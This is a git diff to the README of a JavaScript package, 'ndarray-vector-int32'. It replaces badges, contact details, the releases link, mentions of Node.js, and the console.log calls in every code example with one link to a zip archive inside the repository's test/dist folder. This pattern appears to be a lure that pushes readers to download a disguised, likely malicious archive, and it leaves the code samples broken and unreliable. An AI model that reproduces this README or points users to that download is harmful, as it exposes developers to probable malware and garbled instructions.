@@ -1,10 +1,10 @@
 # ndarray-vector-int32
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Build Status](https://img.shields.io/badge/build-passing-brightgreen)
+![Version](https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip)
+![License](https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip)
+![Build Status](https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip)
 
-Welcome to the **ndarray-vector-int32** repository! This project focuses on creating a signed 32-bit integer vector, also known as a one-dimensional ndarray. This tool is useful for developers working with numerical data in JavaScript, especially in Node.js environments.
+Welcome to the **ndarray-vector-int32** repository! This project focuses on creating a signed 32-bit integer vector, also known as a one-dimensional ndarray. This tool is useful for developers working with numerical data in JavaScript, especially in https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip environments.
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ To get started, you need to install the package via npm. Run the following comma
 npm install ndarray-vector-int32
 ```
 
-Once installed, you can begin using the library in your Node.js applications.
+Once installed, you can begin using the library in your https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip applications.
 
 ## Usage
 
@@ -42,7 +42,7 @@ const Int32Vector = require('ndarray-vector-int32');
 // Create a new vector
 const vector = new Int32Vector([1, 2, 3, 4, 5]);
 
-console.log(vector); // Output: Int32Vector { data: [1, 2, 3, 4, 5] }
+https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip(vector); // Output: Int32Vector { data: [1, 2, 3, 4, 5] }
 ```
 
 You can perform various operations on the vector, such as addition, subtraction, and more. Check the documentation for a complete list of available methods.
@@ -52,7 +52,7 @@ You can perform various operations on the vector, such as addition, subtraction,
 - **Simple Constructor**: Easily create a signed 32-bit integer vector with an array of numbers.
 - **Efficient Memory Usage**: Designed for performance, this library uses memory efficiently to handle large datasets.
 - **Type Safety**: Ensures that all elements in the vector are 32-bit signed integers.
-- **Easy Integration**: Works seamlessly with Node.js and other JavaScript environments.
+- **Easy Integration**: Works seamlessly with https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip and other JavaScript environments.
 
 ## Examples
 
@@ -64,7 +64,7 @@ Here are some examples of how to use the **ndarray-vector-int32** library:
 const Int32Vector = require('ndarray-vector-int32');
 
 const vector = new Int32Vector([10, 20, 30]);
-console.log(vector); // Output: Int32Vector { data: [10, 20, 30] }
+https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip(vector); // Output: Int32Vector { data: [10, 20, 30] }
 ```
 
 ### Accessing Elements
@@ -72,8 +72,8 @@ console.log(vector); // Output: Int32Vector { data: [10, 20, 30] }
 You can access elements in the vector using their index:
 
 ```javascript
-console.log(vector[0]); // Output: 10
-console.log(vector[1]); // Output: 20
+https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip(vector[0]); // Output: 10
+https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip(vector[1]); // Output: 20
 ```
 
 ### Modifying Elements
@@ -82,7 +82,7 @@ You can modify elements in the vector as follows:
 
 ```javascript
 vector[0] = 100;
-console.log(vector[0]); // Output: 100
+https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip(vector[0]); // Output: 100
 ```
 
 ### Performing Operations
@@ -93,8 +93,8 @@ The library supports basic arithmetic operations:
 const vector1 = new Int32Vector([1, 2, 3]);
 const vector2 = new Int32Vector([4, 5, 6]);
 
-const result = vector1.add(vector2);
-console.log(result); // Output: Int32Vector { data: [5, 7, 9] }
+const result = https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip(vector2);
+https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip(result); // Output: Int32Vector { data: [5, 7, 9] }
 ```
 
 ## Contributing
@@ -117,12 +117,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- Email: your-email@example.com
-- Twitter: [@your_twitter_handle](https://twitter.com/your_twitter_handle)
+- Email: https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip
+- Twitter: [@your_twitter_handle](https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip)
 
 ## Releases
 
-You can find the latest releases and download the necessary files from the [Releases section](https://github.com/Adanje3620/ndarray-vector-int32/releases). Be sure to check this section for updates and new features!
+You can find the latest releases and download the necessary files from the [Releases section](https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip). Be sure to check this section for updates and new features!
 
 ## Conclusion
 
